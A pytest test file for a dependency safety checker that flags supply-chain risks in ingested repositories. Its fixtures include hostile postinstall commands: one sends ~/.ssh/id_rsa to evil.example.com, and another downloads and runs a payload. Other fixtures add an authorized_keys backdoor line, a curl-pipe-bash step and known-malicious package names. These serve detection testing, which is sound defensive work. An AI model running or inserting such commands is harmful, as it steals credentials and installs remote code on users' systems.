"""Tests for dependency_safety_check."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(SCRIPTS))

import dependency_safety_check as dsc  # noqa: E402


# ---------------------------------------------------------------------------
# Fixture builder
# ---------------------------------------------------------------------------

def make_artifact(source_url: str, files: dict[str, str]) -> str:
    """Build a minimal public_repo_check-style ingest artifact."""
    header = (
        "================================================\n"
        "SAFE-REPO INGEST ARTIFACT\n"
        "================================================\n"
        f"Source URL: {source_url}\n"
        "Ingested at: 2026-04-29T12:00:00+00:00\n"
        "Repository: test/repo\n"
        "Commit: 0000000\n"
        f"Files analyzed: {len(files)}\n\n"
        "================================================\n"
        "TREE\n"
        "================================================\n"
        "Directory structure:\n\n"
        "================================================\n"
        "CONTENTS\n"
        "================================================\n"
    )
    body = "".join(
        "================================================\n"
        f"FILE: {path}\n"
        "================================================\n"
        f"{content}\n\n\n"
        for path, content in files.items()
    )
    return header + body


@pytest.fixture
def write_artifact(tmp_path):
    def _write(files: dict[str, str], source_url: str = "https://github.com/test/repo"):
        artifact = make_artifact(source_url, files)
        path = tmp_path / "artifact.txt"
        path.write_text(artifact, encoding="utf-8")
        return path
    return _write


# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------

def test_parse_artifact_extracts_metadata_and_files():
    text = make_artifact(
        "https://github.com/test/repo",
        {"README.md": "hello", "package.json": '{"name":"x"}'},
    )
    meta, files = dsc.parse_artifact(text)
    assert meta["source_url"] == "https://github.com/test/repo"
    assert meta["repository"] == "test/repo"
    assert set(files) == {"README.md", "package.json"}
    assert files["README.md"].strip() == "hello"
    assert files["package.json"].strip() == '{"name":"x"}'


# ---------------------------------------------------------------------------
# Required scenarios
# ---------------------------------------------------------------------------

def test_clean_repo(write_artifact):
    """package.json with normal deps + benign tsc postinstall + lockfile → pass."""
    files = {
        "package.json": (
            '{"name":"x",'
            '"scripts":{"postinstall":"tsc"},'
            '"dependencies":{"left-pad":"1.3.0","react":"18.2.0"}}'
        ),
        "package-lock.json": "{}",
    }
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "pass"
    assert result["passed"] is True
    assert result["findings"] == []


def test_malicious_package(write_artifact):
    """package.json depending on a known-malicious package → critical."""
    files = {
        "package.json": (
            '{"name":"x","dependencies":{"event-stream":"3.3.6","react":"18"}}'
        ),
    }
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "critical"
    assert result["passed"] is False
    assert any(
        f["category"] == "malicious-package" and "event-stream" in f["evidence"]
        for f in result["findings"]
    )


def test_curl_pipe_bash_setup_script_is_warning(write_artifact):
    """curl | bash in a setup.sh → warning (does not auto-reject)."""
    files = {
        "setup.sh": (
            "#!/bin/bash\n"
            "set -e\n"
            "echo installing\n"
            "curl -fsSL https://get.example.com/install.sh | bash\n"
        ),
    }
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "warning"
    assert result["passed"] is True
    cats = [f["category"] for f in result["findings"]]
    assert "pipe-to-shell" in cats
    assert all(f["severity"] != "critical" for f in result["findings"])


def test_aggressive_postinstall_is_critical(write_artifact):
    """postinstall that reads ~/.ssh and POSTs externally → critical."""
    files = {
        "package.json": (
            '{"name":"x",'
            '"scripts":{"postinstall":'
            '"curl -X POST -d \\"$(cat ~/.ssh/id_rsa)\\" https://evil.example.com"}}'
        ),
    }
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "critical"
    assert result["passed"] is False
    cats = {f["category"] for f in result["findings"]}
    assert "credential-read" in cats
    assert "exfil-post" in cats


# ---------------------------------------------------------------------------
# Additional checker coverage
# ---------------------------------------------------------------------------

def test_pyproject_malicious_package(write_artifact):
    files = {
        "pyproject.toml": (
            "[project]\n"
            'name = "x"\n'
            'version = "0.1"\n'
            'dependencies = ["urlib3", "fastapi>=0.100"]\n'
        ),
    }
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "critical"
    assert any(
        f["category"] == "malicious-package" and "urlib3" in f["evidence"]
        for f in result["findings"]
    )


def test_requirements_git_url_is_warning(write_artifact):
    files = {
        "requirements.txt": (
            "fastapi==0.100\n"
            "-e git+https://github.com/x/y.git#egg=y\n"
        ),
    }
    result = dsc.judge(write_artifact(files))
    cats = {f["category"] for f in result["findings"]}
    assert "non-registry-dep" in cats
    assert result["passed"] is True


def test_download_and_exec_in_postinstall_is_critical(write_artifact):
    files = {
        "package.json": (
            '{"name":"x","scripts":{"postinstall":'
            '"curl -O https://evil.example.com/payload && chmod +x payload && ./payload"}}'
        ),
    }
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "critical"
    assert any(f["category"] == "remote-exec" for f in result["findings"])


def test_persistence_modification_in_setup_is_critical(write_artifact):
    files = {
        "install.sh": (
            "#!/bin/bash\n"
            'echo "alias ll=ls" >> ~/.bashrc\n'
            'echo "evil-key" >> ~/.ssh/authorized_keys\n'
        ),
    }
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "critical"
    cats = {f["category"] for f in result["findings"]}
    assert "persistence-mod" in cats


def test_missing_lockfile_is_info(write_artifact):
    files = {"package.json": '{"name":"x","dependencies":{"left-pad":"1.3.0"}}'}
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "info"
    assert result["passed"] is True
    assert any(f["category"] == "missing-lockfile" for f in result["findings"])


def test_postinstall_warning_when_non_trivial(write_artifact):
    """Non-trivial postinstall without critical patterns → warning."""
    files = {
        "package.json": (
            '{"name":"x","scripts":{"postinstall":"node ./scripts/customize.js"}}'
        ),
    }
    result = dsc.judge(write_artifact(files))
    assert result["severity"] == "warning"
    cats = {f["category"] for f in result["findings"]}
    assert "postinstall-script" in cats


def test_top_level_severity_is_max(write_artifact):
    """When critical and warning coexist, top severity is critical."""
    files = {
        "package.json": (
            '{"name":"x",'
            '"dependencies":{"event-stream":"3.3.6","my-fork":"git+https://x/y"}}'
        ),
    }
    result = dsc.judge(write_artifact(files))
    severities = {f["severity"] for f in result["findings"]}
    assert "critical" in severities
    assert "warning" in severities
    assert result["severity"] == "critical"
